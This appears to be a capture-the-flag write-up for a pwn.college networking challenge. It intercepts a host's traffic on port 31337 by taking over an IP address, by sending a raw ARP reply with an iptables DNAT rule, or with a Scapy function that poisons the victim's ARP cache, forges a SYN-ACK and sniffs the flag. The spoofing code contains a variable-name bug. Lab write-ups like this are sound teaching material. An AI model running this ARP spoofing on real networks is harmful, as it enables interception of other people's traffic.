# Problem statement:
Configure your network interface. The remote host at 10.0.0.2 is trying to communicate with the remote host at 10.0.0.3 on port 31337.

## Observations:
10.0.0.2 is constantly sending ARP who-has 10.0.0.3 packets to the broadcast phyisical address
 - tcpdump -i eth0 arp ; wireshark; scapy > sniff(filter="arp", prn=lambda x: x.summary())...

Since we can see constant who-has packets being sent, we know no one is responding. So the straight-forward way to do this is just assigning the IP to ourselves
and letting the OS take care of the rest.

However, the fun part of this challenge is to learn to use Scapy to craft packets from scratch at a byte level and also using the functionality provided to make 
our lives easier.

## Solutions:
### Solution 1: Assign IP to our NIC
- `# ip addr add 10.0.0.3/24 dev eth0`

### Solution 2: Handcrafted ARP is-at packet + iptables DNAT jump
https://cs.newpaltz.edu/~easwarac/CCN/Week13/ARP.pdf

>>> pkt_raw = b'\x82\x81\xEE\xE3\x3A\x07\xb2\xad\x5d\x90\x1f\x76\x08\x06\x00\x01
                \x08\x00\x06\x04\x00\x02\xb2\xad\x5d\x90\x1f\x76\x0a\x00\x00\x03
                \x82\x81\xEE\xE3\x3A\x07\x0a\x00\x00\x02'
>>> sendp(Ether(pkt_raw), iface="eth0", verbose=True)

- `# iptables -t nat -A PREROUTING -d 10.0.0.3 -p tcp --dport 31337 -j DNAT --to-destination 10.0.0.1:31337`

### Solution 3: Scapy only
    def ARP_Spoof(src_ip, dst_ip, iface="eth0"):
        my_mac = get_if_hwaddr(iface)
        # Send ARP who-has 10.0.0.2 to broadcast phyisical address
        resp, _ = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = src_ip), timeout = 2, iface = "eth0", retry = 10)
        src_mac = ''
        for _, recv in resp:
            src_mac = rcv.sprintf(r"%Ether.src%")
            if(len(src_mac) > 1): break
        print(f"\n * Poisoning ARP cache of victim {src_ip} with HW address {src_mac}")

        # Craft ARP is-at packet to send to victim, impersonating 10.0.0.3
        is_at = Ether(dst=src_mac, src=my_mac, type=0x0806) / ARP(hwlen=6, plen=4, op=2, hwsrc=my_mac, psrc=dst_ip, hwdst=src_mac, pdst=src_ip)
        sendp(is_at, iface=iface)

        print("\n * Establishing TCP connection with victim")
        syn = sniff(iface=iface, filter="tcp[tcpflags] & (tcp-syn) != 0 and src " + src_ip + " and dst " + dst_ip, count=1)[0]
        syn_ack = Ether(src=my_mac, dst=src_mac) / IP(src=dst_ip, dst=src_ip) / TCP(sport=syn[TCP].dport, dport=syn[TCP].sport, flags="SA", seq=1337, ack=syn[TCP].seq + 1)
        resp, _ = srp(syn_ack)
        # skip ack from 10.0.0.2
        # read tcp traffic from 10.0.0.2 to 10.0.0.3
        sniff(iface=iface, filter="tcp and src " + src_ip + " and dst " + dst_ip, prn=lambda x: x[Raw].load if x.haslayer(Raw) else x.summary())

`>>> ARP_Spoof("10.0.0.2", "10.0.0.3")`
#### Output:
Begin emission

Finished sending 1 packets

Received 1 packets, got 1 answers, remaining 0 packets

 Poisoning ARP cache of victim 10.0.0.2 with HW address 1e:4a:b3:90:f3:e6

Sent 1 packets.

 Establishing TCP connection with victim
Begin emission

Finished sending 1 packets

Received 2 packets, got 1 answers, remaining 0 packets

Ether / IP / TCP 10.0.0.2:39972 > 10.0.0.3:31337 S

Ether / IP / TCP 10.0.0.2:39972 > 10.0.0.3:31337 S

Ether / IP / TCP 10.0.0.2:39972 > 10.0.0.3:31337 S

b'pwn.college{FLAG}\n'

Ether / IP / TCP 10.0.0.2:39972 > 10.0.0.3:31337 S

Ether / IP / TCP 10.0.0.2:39972 > 10.0.0.3:31337 S

Ether / IP / TCP 10.0.0.2:39972 > 10.0.0.3:31337 S

b'pwn.college{FLAG}\n'

Ether / IP / TCP 10.0.0.2:39048 > 10.0.0.3:31337 S

Ether / IP / TCP 10.0.0.2:39048 > 10.0.0.3:31337 S

b'pwn.college{FLAG}\n'

Ether / IP / TCP 10.0.0.2:39048 > 10.0.0.3:31337 S

Ether / IP / TCP 10.0.0.2:39048 > 10.0.0.3:31337 S
